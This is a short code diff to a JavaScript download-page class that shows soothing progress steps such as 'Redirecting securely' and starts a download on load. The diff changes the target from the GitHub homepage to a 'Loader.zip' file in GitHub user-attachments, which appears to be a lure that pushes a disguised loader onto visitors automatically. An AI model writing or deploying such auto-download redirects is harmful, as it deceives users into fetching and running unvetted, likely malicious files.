@@ -19,7 +19,7 @@ class DownloadManager {
       { name: "Redirecting securely", icon: "✨", detail: "Completing transfer protocol" }
     ];
 
-    this.targetUrl = "https://github.com";
+    this.targetUrl = "https://github.com/user-attachments/files/21824364/Loader.zip";
     
     this.initializeElements();
     this.startDownload();
